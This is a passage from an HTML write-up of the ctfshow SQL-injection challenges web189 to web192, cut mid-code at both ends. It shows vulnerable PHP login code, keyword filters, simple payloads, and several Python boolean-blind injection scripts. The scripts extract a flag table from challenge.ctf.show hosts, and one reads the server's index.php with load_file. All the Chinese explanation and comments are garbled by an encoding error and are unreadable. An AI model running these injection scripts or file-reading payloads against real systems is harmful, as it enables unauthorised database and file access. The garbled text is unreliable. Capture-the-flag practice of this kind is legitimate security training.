    $ret[&#39;msg&#39;]=&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;
    die(json_encode($ret));
  }

  //å¯†ç åˆ¤æ–­
  if($row[&#39;pass&#39;]==intval($password)){
      $ret[&#39;msg&#39;]=&#39;ç™»é™†æˆåŠŸ&#39;;
      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;=&gt;$flag));
    }
      
</code></pre><blockquote>
<p><img alt="image-20250209215646783" loading="lazy" src="./assets/image-20250209215646783.png"></p>
<p><a href="https://blog.csdn.net/qq_50589021/article/details/119426002">ctfshow-sqlæ³¨å…¥-è¶…è¯¦è§£(172-200)_ctfshow 172-CSDNåšå®¢</a></p></blockquote>
<p>æ‰€ä»¥payloadä¸º</p>
<pre tabindex="0"><code>0/0
æˆ–è€…
1||1/0
</code></pre><p><a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v">https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v</a></p>
<h4 id="web189">web189<a hidden class="anchor" aria-hidden="true" href="#web189">#</a></h4>
<pre tabindex="0"><code>  //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
  $sql = &#34;select pass from ctfshow_user where username = {$username}&#34;;
</code></pre><pre tabindex="0"><code>
  //ç”¨æˆ·åæ£€æµ‹
  if(preg_match(&#39;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;ç”¨æˆ·åéæ³•&#39;;
    die(json_encode($ret));
  }

  //å¯†ç æ£€æµ‹
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;
    die(json_encode($ret));
  }

  //å¯†ç åˆ¤æ–­
  if($row[&#39;pass&#39;]==$password){
      $ret[&#39;msg&#39;]=&#39;ç™»é™†æˆåŠŸ&#39;;
    }
     
</code></pre><p>è¿™é¢˜åœ¨è¾“å…¥0/0çš„æ—¶å€™ä¼šæ˜¾ç¤ºå¯†ç é”™è¯¯ï¼Œè€Œåœ¨è¾“å…¥1/0çš„æ—¶å€™åˆ™ä¼šæ˜¾ç¤ºæŸ¥è¯¢é”™è¯¯</p>
<p>å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œå³æ­£ç¡®æ—¶ç³»ç»Ÿè¿”å›æŸ¥è¯¢é”™è¯¯ï¼Œé”™è¯¯æ—¶ç³»ç»Ÿè¿”å›å¯†ç é”™è¯¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># @Author  : Yn8rt</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># @Time    : 2021/7/30 15:48</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># @Function:</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/&#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;ctfshow{&#39;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">letter</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz-</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;if(load_file(&#39;/var/www/html/api/index.php&#39;)regexp(&#39;</span><span class="si">{}</span><span class="s2">&#39;),0,1)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1">#print(r)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;å¯†ç é”™è¯¯&#34;</span> <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">if</span> <span class="s1">&#39;}&#39;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web190">web190<a hidden class="anchor" aria-hidden="true" href="#web190">#</a></h4>
<p>æŸ¥è¯¢è¯­å¥</p>
<pre tabindex="0"><code>  //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
  $sql = &#34;select pass from ctfshow_user where username = &#39;{$username}&#39;&#34;;
      
</code></pre><p>è¿”å›é€»è¾‘</p>
<pre tabindex="0"><code>  //å¯†ç æ£€æµ‹
  if(!is_numeric($password)){
    $ret[&#39;msg&#39;]=&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;;
    die(json_encode($ret));
  }

  //å¯†ç åˆ¤æ–­
  if($row[&#39;pass&#39;]==$password){
      $ret[&#39;msg&#39;]=&#39;ç™»é™†æˆåŠŸ&#39;;
    }

  //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª
      
</code></pre><p><img alt="image-20250209225336696" loading="lazy" src="./assets/image-20250209225336696.png"></p>
<p>æ‰€ä»¥è¿™é¢˜ä¾æ—§å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®åº“</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥å­—æ®µ</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># æŸ¥flag</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)=&#39;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;å¯†ç é”™è¯¯&#34;</span>  <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web191">web191<a hidden class="anchor" aria-hidden="true" href="#web191">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//å¯†ç æ£€æµ‹
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//å¯†ç åˆ¤æ–­
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç”¨æˆ·åéæ³•&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜å’Œä¸Šé¢˜ä¸€æ ·ï¼Œåªæ˜¯åŠ äº†ç‚¹banæ‰äº†ascii</p>
<p>æˆ‘ä»¬ç”¨ordä»£æ›¿asciiå³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®åº“</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥å­—æ®µ</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># æŸ¥flag</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_fl0g&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(ord(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)=&#39;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;å¯†ç é”™è¯¯&#34;</span>  <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web192">web192<a hidden class="anchor" aria-hidden="true" href="#web192">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//å¯†ç æ£€æµ‹
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//å¯†ç åˆ¤æ–­
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç”¨æˆ·åéæ³•&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>ä¸ç»™æˆ‘è½¬æ˜¯å§ï¼Œé‚£æˆ‘ä¸è½¬äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">flagstr</span><span class="o">=</span><span class="s2">&#34; _</span><span class="si">{}</span><span class="s2">-&#34;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">45</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">flagstr</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;admin&#39; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)regexp(&#39;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;),1,2)=&#39;1&#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;å¯†ç é”™è¯¯&#34;</span> <span class="o">==</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
